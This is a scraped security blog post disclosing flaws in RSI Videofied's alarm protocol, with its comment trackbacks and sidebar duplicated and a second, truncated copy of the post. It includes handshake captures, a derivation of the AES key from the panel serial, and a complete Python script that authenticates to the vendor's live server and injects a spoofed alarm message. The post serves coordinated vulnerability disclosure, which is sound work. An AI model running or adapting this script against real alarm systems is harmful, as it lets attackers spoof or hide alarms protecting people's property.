This entry was posted in [Alarms](https://cybergibbons.com/category/alarms-2/), [Security](https://cybergibbons.com/category/security-2/). Bookmark the [permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/ "Permalink to Multiple serious vulnerabilities in RSI Videofied’s alarm protocol").

## 11 thoughts on “Multiple serious vulnerabilities in RSI Videofied’s alarm protocol”

1. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428103)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428103#respond)
   #### [RSI Videofied Security Alarm Protocol Flawed, Attackers Can Intercept Alarms | Wolf Halton, Open-Source Security](http://wolfhalton.info/2015/11/30/rsi-videofied-security-alarm-protocol-flawed-attackers-can-intercept-alarms/)

   November 30, 2015 at 5:36pm

   […] Videofied is a French manufacturer of alarm systems. According to research carried out by Cybergibbons Limited, one of their recently launched alarm system lines ha… (read more) Source: […]
3. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428108)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428108#respond)
   #### [VU#792004: RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/vu792004-rsi-video-technologies-videofied-security-system-frontel-software-uses-an-insecure-custom-protocol/)

   November 30, 2015 at 5:58pm

   […] For more information, please see the researcher’s blog post. […]
5. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428134)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428134#respond)
   #### [VU#792004: RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol - cPanel Knowledge](http://www.cpanelknowledge.com/vu792004-rsi-video-technologies-videofied-security-system-frontel-software-uses-an-insecure-custom-protocol/)

   November 30, 2015 at 9:53pm

   […] For more information, please see the researcher’s blog post. […]
7. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428198)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428198#respond)
   #### [Videofied Alarm System Flaws Allow Hackers to Intercept Data | Cyber Security News](https://cyber-security.news/videofied-alarm-system-flaws-allow-hackers-to-intercept-data)

   December 1, 2015 at 11:14am

   […] with UK-based security consultancy Cybergibbons analyzed W Panel, one of the Videofied control panels designed for use in residential, small business and […]
9. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428625)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428625#respond)
   #### [Videofied Alarm System Flaws, Allow Hackers to Intercept Data | »XoZZeN«](http://www.xozzen.com/blog/videofied-alarm-system-flaws-allow-hackers-to-intercept-data/)

   December 4, 2015 at 1:53pm

   […] and videos when an alarm is triggered. Researchers with UK-based security consultancy Cybergibbons analyzed W Panel, one of the Videofied control panels designed for use in residential, small business and […]
11. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432107)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432107#respond)
    #### [SB15-363: Vulnerability Summary for the Week of December 21, 2015 « CyberSafe NV](http://cybersafenv.org/sb15-363-vulnerability-summary-for-the-week-of-december-21-2015/)

    December 29, 2015 at 5:38pm

    […] CVE-2015-8252CERT-VNMISC […]
13. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432126)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432126#respond)
    #### [SB15-363: Vulnerability Summary for the Week of December 21, 2015 - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/sb15-363-vulnerability-summary-for-the-week-of-december-21-2015/)

    December 29, 2015 at 10:01pm

    […] CVE-2015-8252CERT-VNMISC […]
15. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432865)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432865#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 « CyberSafe NV](http://cybersafenv.org/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 4, 2016 at 3:58pm

    […] CVE-2015-8252CERT-VNMISC […]
17. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432875)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432875#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 4, 2016 at 4:53pm

    […] CVE-2015-8252CERT-VNMISC […]
19. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432924)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432924#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 | 007 Software](http://007software.net/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 5, 2016 at 2:51am

    […] CVE-2015-8252CERT-VNMISC […]
21. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-433412)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=433412#respond)
    #### [SB15-363 Vulnerability Summary for the Week of December 21st 2015 | ECI Networks](http://ecinetworks.com/sb15-363-vulnerability-summary-for-the-week-of-december-21st-2015/)

    January 8, 2016 at 6:07pm

    […] CVE-2015-8252 CERT-VN MISC […]

### Leave a Reply [Cancel reply](/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#respond)

Your email will not be published. Name and Email fields are required.

CommentName
Email
Website

 Notify me of follow-up comments by email.

 Notify me of new posts by email.

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

# Categories

* [Alarms](https://cybergibbons.com/category/alarms-2/) (48)
  + [Alarm technologies](https://cybergibbons.com/category/alarms-2/alarm-technologies/) (5)
  + [Friedland Response reverse engineering](https://cybergibbons.com/category/alarms-2/friedland-response-reverse-engineering/) (8)
  + [Signalling devices](https://cybergibbons.com/category/alarms-2/signalling-devices/) (19)
* [Arduino](https://cybergibbons.com/category/arduino/) (9)
* [Cycling](https://cybergibbons.com/category/cycling/) (1)
* [Electronics](https://cybergibbons.com/category/electronics/) (5)
* [General tips](https://cybergibbons.com/category/general-tips/) (1)
* [Hardware Hacking](https://cybergibbons.com/category/hardware-hacking/) (10)
* [Heat pump monitor](https://cybergibbons.com/category/heat-pump-monitor/) (3)
* [Linux](https://cybergibbons.com/category/linux/) (1)
* [Lockpicking](https://cybergibbons.com/category/lockpicking-2/) (2)
* [Opinion](https://cybergibbons.com/category/opinion/) (3)
* [Quadcopter](https://cybergibbons.com/category/quadcopter/) (2)
* [Reverse Engineering](https://cybergibbons.com/category/reverse-engineering-2/) (17)
* [Reviews](https://cybergibbons.com/category/reviews/) (8)
  + [StickNFind](https://cybergibbons.com/category/reviews/sticknfind/) (8)
* [Security](https://cybergibbons.com/category/security-2/) (82)
  + [Bitfi](https://cybergibbons.com/category/security-2/bitfi/) (4)
  + [Burp Suite](https://cybergibbons.com/category/security-2/burp-suite/) (1)
  + [Nebula walkthrough](https://cybergibbons.com/category/security-2/nebula-walkthrough/) (11)
  + [Shodan Searches](https://cybergibbons.com/category/security-2/shodan-searches/) (8)
* [Uncategorized](https://cybergibbons.com/category/uncategorized/) (52)
# Tweets!

[My Tweets](https://twitter.com/cybergibbons)

* [RSS - Posts](https://cybergibbons.com/feed/ "Subscribe to posts")
* [RSS - Comments](https://cybergibbons.com/comments/feed/ "Subscribe to comments")

Powered by [WordPress](http://wordpress.org/). [Debut](https://github.com/kwight/debut/) theme by kwight.



=== Content from cybergibbons.com_e41e1e22_20250126_121441.html ===

# Menu

[Skip to content](#content)
Menu

* [Home](https://cybergibbons.com/)
* [About](https://cybergibbons.com/about-2/)
* [Contact](https://cybergibbons.com/contact/)
* [PGP key](https://cybergibbons.com/pgp-key/)

# [Cybergibbons](https://cybergibbons.com/)

## Reverse engineer, hardware hacker, security analyst, lock picker, heist planner. Definitely not involved in the Hatton Garden job.

Search

# Menu

[Skip to content](#content)

* [Home](https://cybergibbons.com/)
* [About](https://cybergibbons.com/about-2/)
* [Contact](https://cybergibbons.com/contact/)
* [PGP key](https://cybergibbons.com/pgp-key/)

# Multiple serious vulnerabilities in RSI Videofied’s alarm protocol

Posted on [November 30, 2015](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/) by [cybergibbons](https://cybergibbons.com/author/cybergibbons/ "View all posts by cybergibbons")

[RSI Videofied](http://www.videofied.com/eu/uk/home/) are a French company that produce a series of alarm panels that are fairly unique in the market. They are designed to be battery powered and send videos from the detectors if the alarm is triggered. This is called video verification. They are frequently used on building sites and disused buildings.

They send data over either GPRS (mobile) or IP. Whilst reverse engineering as part of competitor analysis for a client, I found a large number of vulnerabilities in the protocol they use to communicate.

In summary, the protocol is so broken that it provides no security, allowing an attacker to easily spoof or intercept alarms.

As appears to be the norm in the physical security world, the vendor failed to respond over the course of 6 weeks, so this was taken to CERT/CC for disclosure. ~~They are due for disclosure 30 November 2015.~~ CERT/CC have [released their report.](http://www.kb.cert.org/vuls/id/792004)

The issues were found in their newest [W Panels](https://www.videofied.com/eu/uk/products/w_panel/) in mid-2015.

The following CVEs have been assigned:

* CWE-321: Use of Hard-coded Cryptographic Key – CVE-2015-8252
* CWE-311: Missing Encryption of Sensitive Data – CVE-2015-8253
* CWE-345: Insufficient Verification of Data Authenticity – CVE-2015-8254

RSI Videofied have stated to CERT/CC that this is fixed in version 3 of their protocol which is currently being rolled out.

## Weak authentication

When the panel initially communicates with the receiving server, there is an authentication handshake (R is received by panel, S is sent by panel)

```
R: IDENT,1000.
S: IDENT,EA00121513080139,2.
R: VERSION2,0.AUTH1,9301D4E13A1CDF51F873C790AFD602AF.
S: AUTH2,91A4E381AF21ECEB010FA0EE83021D48,D8717F423736A1F01510D25E919A3ED2.
R: AUTH3,8EE8E00CFEFEF83C76D34A6B7EC4BB23.
S: AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7.ALARM,
```

This looks like some kind of challenge/response. EA00121513080139 is the panel’s serial number. 1440 is the account number for that particular panel.

Brief entropy analysis of the long strings in AUTH1, AUTH2, and AUTH3 showed them to be random.

A Python script was created to mimic the panel.

It was noted that if the serial number was altered, the response was different:

```
R: IDENT,1000
S: IDENT,EA00121513080136,2
R: SETKEY,10680211105310035016110010318802
R: VERSION,2,0 AUTH1,D5689F494D81ECA07E72CC0F3459ED4E
```

It appears that the first time a particular server sees a serial number, it informs the panel of the key used for the challenge/response. If we then attempt to connect again, the key is not shown to us.

It was then seen that connecting the panel to a new server at a different alarm receiving centre delivered exactly the same key. This means that the key is deterministic. It also means that to obtain the key for any given panel, all we need to do is send the serial number to another Videofied server (of which there are many).

However, we can go further than this. Notice that the key delivered above has a lot of common numbers with the serial number. It appears that the key is just a mixed up serial number:

```
R: IDENT,1000
S: IDENT,0000000000000000,2
R: SETKEY,00000000000010000000000000010000 VERSION,2,0 A
R: AUTH1,6587DA1323597F4AC986936BAF20102B

R: IDENT,1000
S: IDENT,0000000000000020,2
R: SETKEY,00000000000210000000000000210000
R: VERSION,2,0 AUTH1,0A79588F06FEB594D153237230BA0D61

R: IDENT,1000
S: IDENT,0123456789ABCDEF,2
R: SETKEY,40FB05D68C7E10A97A4FD6C080E1BB05
R: VERSION,2,0 AUTH1,D4F98DF37EF53F52505599D833484658
```

This means that we can trivially determine the key used for authentication using the serial number that is sent in the plain immediately beforehand.

The challenge response protocol is as follows:

```
Server: Random server challenge
Panel:  AES(Random server challenge, key) | Random panel challenge
Server: AES(Random panel challenge, key)
```

Now that we have the key, it is very easy for us to spoof this.

```
import socket
from Crypto.Cipher import AES
from Crypto import Random

# 4i Security's server and port
rsi_server = 'rsi.videofied.com'
rsi_port = 888
# This is the valid alarm serial
serial = 'A3AAA3AAA2AAAAAA'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rsi_server, rsi_port))

# Open a connection to the server should see
# IDENT,1000
print 'R:',s.recv(1024)

# This is the valid serial number from the board
msg = 'IDENT,' + serial + ',2\x1a'
print 'S:', msg
s.send(msg)

# Should receive
# VERSION,2,0
print 'R:', s.recv(1024)

# AUTH1,<16 byte challege>
auth1 = s.recv(1024)
print 'R:', auth1

# Split out challenge
challenge = auth1.split(',')[-1][:-1]
print 'Challenge:', challenge

# The key is just a jumbled up serial.
# This means the key is entirely deterministic and can be guessed from one sniffed packet.
key = serial[4] + '0' + serial[15] + serial[11] + '0' + serial[5] + serial[13] + serial[6] + serial[8] + serial[12] + serial[7] + serial[14] + '1' + '0' \
    + serial[10] + serial[9] + serial[7] + serial[10] + serial [4] + serial[15] + serial[13] + serial[6] + serial[12] + '0' + serial[8] + '0' + serial[14] + \
    '1' + serial[11] + serial[11] + '0' + serial[5]

cipher = AES.new(key.decode('hex'))

# Encrypt in EBC mode
response = cipher.encrypt(challenge.decode('hex')).encode('hex').upper()

print 'Response:', response

# Generate our own random challange
challenge = Random.new().read(16).encode('hex').upper()

# Send back response in form:
# AUTH2,<16 byte response>,<16 byte challenge>
msg = 'AUTH2,' + response + ',' + challenge + '\x1a'

print 'S:', msg
s.send(msg)

# Calculate the expected response
print 'Expected Response', cipher.encrypt(challenge.decode('hex')).encode('hex').upper()

# This should be the encrypted response from the server
print 'R:', s.recv(1024)

# Send capture status message
msg = 'AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7\x1aALARM,1932\x1a'
print 'S:', msg
s.send(msg)

print s.recv(1024)
```

Clearly this is not good.

## Authentication decoupled from identity

The above authentication ensures that a given panel with a serial number knows the key. Even if this key was secret and non-deterministic, it is entirely decoupled from the identity of the account. The account is the piece of information identifying the panel to the alarm receiving centre.

Notice that in the above authentication, the account number 1440 is not encrypted or linked to the panel serial:

```
R: IDENT,1000.
S: IDENT,EA00121513080139,2.
R: VERSION2,0.AUTH1,9301D4E13A1CDF51F873C790AFD602AF.
S: AUTH2,91A4E381AF21ECEB010FA0EE83021D48,D8717F423736A1F01510D25E919A3ED2.
R: AUTH3,8EE8E00CFEFEF83C76D34A6B7EC4BB23.
S: AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7.ALARM,
```

It turns out that we can simply re-program the panel to use site 1441, and it will report into the alarm receiving centre as account 1441. There is no tie to the serial number, and no authentication of the account number.

## Other basic crypto failings

Beyond the authentication being totally broken, the protocol suffers from further basic issues:

* Nothing is encrypted – anyone can view the content of the messages, including the videos.
* There is no integrity protection such as a message authentication code or even a checksum, meaning that it is easy for messages to be altered deliberately or by accident.
* There are no sequence numbers, which means that messages can be replayed and there is no end-to-end acknowledgement of alarm reception

## Conclusion

The RSI Videofied system has a level of security that is worthless. It looks like they tried something and used a common algorithm – AES – but messed it up so badly that they may as well have stuck with plaintext.

### Share this:

* [Twitter](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=custom-1371585913 "Click to share on Twitter")
* [Facebook](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=facebook "Click to share on Facebook")
* [Reddit](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=reddit "Click to share on Reddit")

This entry was posted in [Alarms](https://cybergibbons.com/category/alarms-2/), [Security](https://cybergibbons.com/category/security-2/). Bookmark the [permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/ "Permalink to Multiple serious vulnerabilities in RSI Videofied’s alarm protocol").

## 11 thoughts on “Multiple serious vulnerabilities in RSI Videofied’s alarm protocol”

1. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428103)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428103#respond)
   #### [RSI Videofied Security Alarm Protocol Flawed, Attackers Can Intercept Alarms | Wolf Halton, Open-Source Security](http://wolfhalton.info/2015/11/30/rsi-videofied-security-alarm-protocol-flawed-attackers-can-intercept-alarms/)

   November 30, 2015 at 5:36pm

   […] Videofied is a French manufacturer of alarm systems. According to research carried out by Cybergibbons Limited, one of their recently launched alarm system lines ha… (read more) Source: […]
3. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428108)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428108#respond)
   #### [VU#792004: RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/vu792004-rsi-video-technologies-videofied-security-system-frontel-software-uses-an-insecure-custom-protocol/)

   November 30, 2015 at 5:58pm

   […] For more information, please see the researcher’s blog post. […]
5. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428134)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428134#respond)
   #### [VU#792004: RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol - cPanel Knowledge](http://www.cpanelknowledge.com/vu792004-rsi-video-technologies-videofied-security-system-frontel-software-uses-an-insecure-custom-protocol/)

   November 30, 2015 at 9:53pm

   […] For more information, please see the researcher’s blog post. […]
7. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428198)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428198#respond)
   #### [Videofied Alarm System Flaws Allow Hackers to Intercept Data | Cyber Security News](https://cyber-security.news/videofied-alarm-system-flaws-allow-hackers-to-intercept-data)

   December 1, 2015 at 11:14am

   […] with UK-based security consultancy Cybergibbons analyzed W Panel, one of the Videofied control panels designed for use in residential, small business and […]
9. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428625)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428625#respond)
   #### [Videofied Alarm System Flaws, Allow Hackers to Intercept Data | »XoZZeN«](http://www.xozzen.com/blog/videofied-alarm-system-flaws-allow-hackers-to-intercept-data/)

   December 4, 2015 at 1:53pm

   […] and videos when an alarm is triggered. Researchers with UK-based security consultancy Cybergibbons analyzed W Panel, one of the Videofied control panels designed for use in residential, small business and […]
11. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432107)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432107#respond)
    #### [SB15-363: Vulnerability Summary for the Week of December 21, 2015 « CyberSafe NV](http://cybersafenv.org/sb15-363-vulnerability-summary-for-the-week-of-december-21-2015/)

    December 29, 2015 at 5:38pm

    […] CVE-2015-8252CERT-VNMISC […]
13. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432126)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432126#respond)
    #### [SB15-363: Vulnerability Summary for the Week of December 21, 2015 - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/sb15-363-vulnerability-summary-for-the-week-of-december-21-2015/)

    December 29, 2015 at 10:01pm

    […] CVE-2015-8252CERT-VNMISC […]
15. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432865)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432865#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 « CyberSafe NV](http://cybersafenv.org/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 4, 2016 at 3:58pm

    […] CVE-2015-8252CERT-VNMISC […]
17. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432875)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432875#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 4, 2016 at 4:53pm

    […] CVE-2015-8252CERT-VNMISC […]
19. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432924)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432924#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 | 007 Software](http://007software.net/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 5, 2016 at 2:51am

    […] CVE-2015-8252CERT-VNMISC […]
21. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-433412)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=433412#respond)
    #### [SB15-363 Vulnerability Summary for the Week of December 21st 2015 | ECI Networks](http://ecinetworks.com/sb15-363-vulnerability-summary-for-the-week-of-december-21st-2015/)

    January 8, 2016 at 6:07pm

    […] CVE-2015-8252 CERT-VN MISC […]

### Leave a Reply [Cancel reply](/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#respond)

Your email will not be published. Name and Email fields are required.

CommentName
Email
Website

 Notify me of follow-up comments by email.

 Notify me of new posts by email.

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

# Categories

* [Alarms](https://cybergibbons.com/category/alarms-2/) (48)
  + [Alarm technologies](https://cybergibbons.com/category/alarms-2/alarm-technologies/) (5)
  + [Friedland Response reverse engineering](https://cybergibbons.com/category/alarms-2/friedland-response-reverse-engineering/) (8)
  + [Signalling devices](https://cybergibbons.com/category/alarms-2/signalling-devices/) (19)
* [Arduino](https://cybergibbons.com/category/arduino/) (9)
* [Cycling](https://cybergibbons.com/category/cycling/) (1)
* [Electronics](https://cybergibbons.com/category/electronics/) (5)
* [General tips](https://cybergibbons.com/category/general-tips/) (1)
* [Hardware Hacking](https://cybergibbons.com/category/hardware-hacking/) (10)
* [Heat pump monitor](https://cybergibbons.com/category/heat-pump-monitor/) (3)
* [Linux](https://cybergibbons.com/category/linux/) (1)
* [Lockpicking](https://cybergibbons.com/category/lockpicking-2/) (2)
* [Opinion](https://cybergibbons.com/category/opinion/) (3)
* [Quadcopter](https://cybergibbons.com/category/quadcopter/) (2)
* [Reverse Engineering](https://cybergibbons.com/category/reverse-engineering-2/) (17)
* [Reviews](https://cybergibbons.com/category/reviews/) (8)
  + [StickNFind](https://cybergibbons.com/category/reviews/sticknfind/) (8)
* [Security](https://cybergibbons.com/category/security-2/) (82)
  + [Bitfi](https://cybergibbons.com/category/security-2/bitfi/) (4)
  + [Burp Suite](https://cybergibbons.com/category/security-2/burp-suite/) (1)
  + [Nebula walkthrough](https://cybergibbons.com/category/security-2/nebula-walkthrough/) (11)
  + [Shodan Searches](https://cybergibbons.com/category/security-2/shodan-searches/) (8)
* [Uncategorized](https://cybergibbons.com/category/uncategorized/) (52)
# Tweets!

[My Tweets](https://twitter.com/cybergibbons)

* [RSS - Posts](https://cybergibbons.com/feed/ "Subscribe to posts")
* [RSS - Comments](https://cybergibbons.com/comments/feed/ "Subscribe to comments")

Powered by [WordPress](http://wordpress.org/). [Debut](https://github.com/kwight/debut/) theme by kwight.



=== Content from cybergibbons.com_ab9466e4_20250126_121437.html ===

# Menu

[Skip to content](#content)
Menu

* [Home](https://cybergibbons.com/)
* [About](https://cybergibbons.com/about-2/)
* [Contact](https://cybergibbons.com/contact/)
* [PGP key](https://cybergibbons.com/pgp-key/)

# [Cybergibbons](https://cybergibbons.com/)

## Reverse engineer, hardware hacker, security analyst, lock picker, heist planner. Definitely not involved in the Hatton Garden job.

Search

# Menu

[Skip to content](#content)

* [Home](https://cybergibbons.com/)
* [About](https://cybergibbons.com/about-2/)
* [Contact](https://cybergibbons.com/contact/)
* [PGP key](https://cybergibbons.com/pgp-key/)

# Multiple serious vulnerabilities in RSI Videofied’s alarm protocol

Posted on [November 30, 2015](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/) by [cybergibbons](https://cybergibbons.com/author/cybergibbons/ "View all posts by cybergibbons")

[RSI Videofied](http://www.videofied.com/eu/uk/home/) are a French company that produce a series of alarm panels that are fairly unique in the market. They are designed to be battery powered and send videos from the detectors if the alarm is triggered. This is called video verification. They are frequently used on building sites and disused buildings.

They send data over either GPRS (mobile) or IP. Whilst reverse engineering as part of competitor analysis for a client, I found a large number of vulnerabilities in the protocol they use to communicate.

In summary, the protocol is so broken that it provides no security, allowing an attacker to easily spoof or intercept alarms.

As appears to be the norm in the physical security world, the vendor failed to respond over the course of 6 weeks, so this was taken to CERT/CC for disclosure. ~~They are due for disclosure 30 November 2015.~~ CERT/CC have [released their report.](http://www.kb.cert.org/vuls/id/792004)

The issues were found in their newest [W Panels](https://www.videofied.com/eu/uk/products/w_panel/) in mid-2015.

The following CVEs have been assigned:

* CWE-321: Use of Hard-coded Cryptographic Key – CVE-2015-8252
* CWE-311: Missing Encryption of Sensitive Data – CVE-2015-8253
* CWE-345: Insufficient Verification of Data Authenticity – CVE-2015-8254

RSI Videofied have stated to CERT/CC that this is fixed in version 3 of their protocol which is currently being rolled out.

## Weak authentication

When the panel initially communicates with the receiving server, there is an authentication handshake (R is received by panel, S is sent by panel)

```
R: IDENT,1000.
S: IDENT,EA00121513080139,2.
R: VERSION2,0.AUTH1,9301D4E13A1CDF51F873C790AFD602AF.
S: AUTH2,91A4E381AF21ECEB010FA0EE83021D48,D8717F423736A1F01510D25E919A3ED2.
R: AUTH3,8EE8E00CFEFEF83C76D34A6B7EC4BB23.
S: AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7.ALARM,
```

This looks like some kind of challenge/response. EA00121513080139 is the panel’s serial number. 1440 is the account number for that particular panel.

Brief entropy analysis of the long strings in AUTH1, AUTH2, and AUTH3 showed them to be random.

A Python script was created to mimic the panel.

It was noted that if the serial number was altered, the response was different:

```
R: IDENT,1000
S: IDENT,EA00121513080136,2
R: SETKEY,10680211105310035016110010318802
R: VERSION,2,0 AUTH1,D5689F494D81ECA07E72CC0F3459ED4E
```

It appears that the first time a particular server sees a serial number, it informs the panel of the key used for the challenge/response. If we then attempt to connect again, the key is not shown to us.

It was then seen that connecting the panel to a new server at a different alarm receiving centre delivered exactly the same key. This means that the key is deterministic. It also means that to obtain the key for any given panel, all we need to do is send the serial number to another Videofied server (of which there are many).

However, we can go further than this. Notice that the key delivered above has a lot of common numbers with the serial number. It appears that the key is just a mixed up serial number:

```
R: IDENT,1000
S: IDENT,0000000000000000,2
R: SETKEY,00000000000010000000000000010000 VERSION,2,0 A
R: AUTH1,6587DA1323597F4AC986936BAF20102B

R: IDENT,1000
S: IDENT,0000000000000020,2
R: SETKEY,00000000000210000000000000210000
R: VERSION,2,0 AUTH1,0A79588F06FEB594D153237230BA0D61

R: IDENT,1000
S: IDENT,0123456789ABCDEF,2
R: SETKEY,40FB05D68C7E10A97A4FD6C080E1BB05
R: VERSION,2,0 AUTH1,D4F98DF37EF53F52505599D833484658
```

This means that we can trivially determine the key used for authentication using the serial number that is sent in the plain immediately beforehand.

The challenge response protocol is as follows:

```
Server: Random server challenge
Panel:  AES(Random server challenge, key) | Random panel challenge
Server: AES(Random panel challenge, key)
```

Now that we have the key, it is very easy for us to spoof this.

```
import socket
from Crypto.Cipher import AES
